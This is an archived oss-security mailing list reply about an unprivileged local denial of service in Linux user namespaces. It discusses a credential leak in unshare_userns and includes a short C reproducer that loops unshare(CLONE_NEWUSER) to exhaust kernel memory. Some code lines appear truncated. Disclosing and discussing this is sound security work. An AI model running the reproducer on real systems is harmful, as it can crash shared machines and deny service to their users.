  oss-security - Re: CLONE_NEWUSER local DoS            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Tue, 6 Aug From: Andy Lutomirski <luto@...capital.net> To: Oleg Nesterov <oleg@...hat.com> Cc: security@...nel.org, oss-security@...ts.openwall.com,  	Petr Matousek <pmatouse@...hat.com>, "Eric W. Biederman" <ebiederm@...ssion.com>,  	Linus Torvalds <torvalds@...ux-foundation.org> Subject: Re: CLONE_NEWUSER local DoS  On Tue, Aug 6, at AM, Oleg Nesterov <oleg@...hat.com> wrote: > On Petr Matousek wrote: >> >> spender reported [1] a local DoS triggerable by unprivileged user when >> user namespaces are enabled (CONFIG_USER_NS). >> >>   [1] >> >> Reproducer: >> >> is > > What happens? OOM? > > I'll recheck, but at first glance this is simple, unshare_userns() > populates new_cred which is not freed by bad_unshare_cleanup_fd > if create_user_ns() fails. And create_user_ns() _should_ fail (iiuc) > when CLONE_NEWUSER is called for the second time and later due to > !kuid_has_mapping(). > > I'll send the patch, but perhaps there is something else. Eric?  I think that's right.  OTOH, it's not going to prevent this from OOMing:  #define _GNU_SOURCE #include <unistd.h> #include <sched.h> #include <sys/types.h> #include <sys/wait.h> #include <fcntl.h> #include <stdio.h> #include <string.h> #include <err.h>  #ifndef CLONE_NEWUSER #define CLONE_NEWUSER #endif  static void setmap(int is_gid, int outer) {   int fd = open(is_gid ? "/proc/self/gid_map" : "/proc/self/uid_map", 		O_RDWR | O_CLOEXEC);   if (fd == -1)     err(1, is_gid ? "open /proc/self/gid_map" : "open /proc/self/uid_map");   char   sprintf(buf, "0 %d 1\n", outer);   if (write(fd, buf, strlen(buf)) < 0)     err(1, is_gid ? "write /proc/self/gid_map" : "write /proc/self/uid_map");   close(fd); }  int main(int argc, char **argv) {   pid_t outer_uid = geteuid(), outer_gid = getegid();    while(1) {     if (unshare(CLONE_NEWUSER) != 0)       err(1, "unshare(CLONE_NEWUSER)");     setmap(1, outer_gid);     setmap(0, outer_uid);     outer_uid = outer_gid = 0;   } }  --Andy  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      